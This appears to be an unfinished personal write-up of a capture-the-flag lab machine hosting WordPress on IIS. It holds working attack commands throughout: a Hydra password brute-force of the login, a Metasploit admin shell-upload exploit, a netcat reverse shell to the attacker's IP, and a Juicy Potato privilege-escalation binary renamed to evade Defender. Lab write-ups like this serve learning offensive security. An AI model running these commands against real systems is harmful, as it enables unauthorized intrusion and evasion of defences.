# 10.10.10.29

---

## nmap -sS -sC -sV -O -oX ./nmap/init.xml 10.10.10.29

```
80/tcp   open  http    Microsoft IIS httpd 10.0
3306/tcp open  mysql   MySQL (unauthorized)
```

---

## Let's check the website

Burp doesn't give anything useful. The site is just a huge PNG with a link attached to it.

Source and Cookies doesn't have any surprises either. Next is gobuster.

---

## gobuster -u 10.10.10.29 -w ./../SecLists-2021.2/Discovery/Web-Content/common.txt dir

Reveals `/wordpress`. Is accessible.

---

## Let's explore the site

There is a `index.php` handling the linkage.

There are some data files for things like comments(?). They don't reveal any secret links in the backend.

---

## There is an admin account in the system.

Blog posts seems to be signed uder `admin`.

But trying to reach `http://10.10.10.29/wordpress/index.php/author/admin/` fails and returns:
```
DAEMONIZE: pcntl_fork() does not exists, moving on...
SOC_ERROR: 10061: No connection could be made because the target machine actively refused it.
```

---

## There is a login page for `Wordpress`.

There is a cookie.

wordpress_test_cookie = WP+Cookie+check

Seems to be a dummy cookie. We may not need to enumerate the cookie or temper with it.

---

## Trying to log in with random values.

Burp found these in the package:
```
log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&testcookie=1
```
testcookie=1 might be preventing us from actually sending in a valid login request.

---

## Sending the request with testcookie=0 doesn'T return anything different.

---

## There is a password reset link.

Trying to reset `admin` password fails due to:
```
The email could not be sent.
Possible reason: your host may have disabled the mail() function.
```

What is mail() function? Missing library in the backend? Disabled API functionality?

---

## Brute forcing the login with Hydra

++ [Helper Blog](https://bentrobotlabs.wordpress.com/2018/04/02/web-site-login-brute-forcing-with-hydra/)

Can `redirect_to` be manipulated for fun stuff?

Command to run:
```
hydra -l admin -P ./../SecLists-2021.2/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt 10.10.10.29 http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&testcookie=1:ERROR"
```

This was fabricated from the examining the requests through both Dev Tools and Burp. I am not %100 sure about the `ERROR` part however.

---

## In the mean time I looked into MySql port.

I am not able to connect and with some digging around it should have been obvious from the beginning. `(Unauthorized)` means my IP is not allowed to connect to the server.

I probably need local access which is where admin account and access comes into play I am guessing.

++ [Source](https://security.stackexchange.com/questions/134873/what-mysql-unauthorized-french-means-when-perfoming-nmap-in-port-3306)

---

## Walkthrough exposes the password to be `P@s5w0rd!`

I don't like using the passwords gained from previous machines but whatever.

We are in and next step is to get a shell up and running.

Metasploit has an exploit in store so moving on with that.

---

## Using Metasploit to get netcat binary on the target.

Commands to run:
```
msfconsole
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf > set PASSWORD P@s5w0rd!
msf > set USERNAME admin
msf > set TARGETURI /wordpress
msf > set RHOSTS 10.10.10.29
msf > run
```

It didn't open up a session however.

How the hell do I connect and run a remote .exe?

Also `msf >` does not recognize `lcd` command.

---

## After some fixes the exploit works.

We navigate to a writeable folder at `C:/inetpub/wwwroot/wordpress/wp-content/uploads`

We upload `Netcat` on the target machine.

We setup a listener locally and run the uploaded program.
```
msf > execute -f nc.exe -a "-e cmd.exe 10.10.16.100 4443"
```

---

## Remote Netcat does not work.

What's better is that `sysinfo` returns `Windows NT SHIELD 10.0 build 14393 (Windows Server 2016) i586` but the command line only accepts unix commands.

It does not recognize Window commands.

---

## Next step is to exploit with a local binary.

[Rotten Potato](https://github.com/ohpe/juicy-potato) exploit can be uploaded onto the server and we can try to run it.

But the `js.exe`(Renamed for Defender bypass) is not recognized as an executeable.

Using `execute -f` creates a process but `shell.bat` that `js.exe` is spouse to run never connects back to our local listener.

```
execute -f js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
Process 4808 created.
```

---

I am out of time and this is it for now.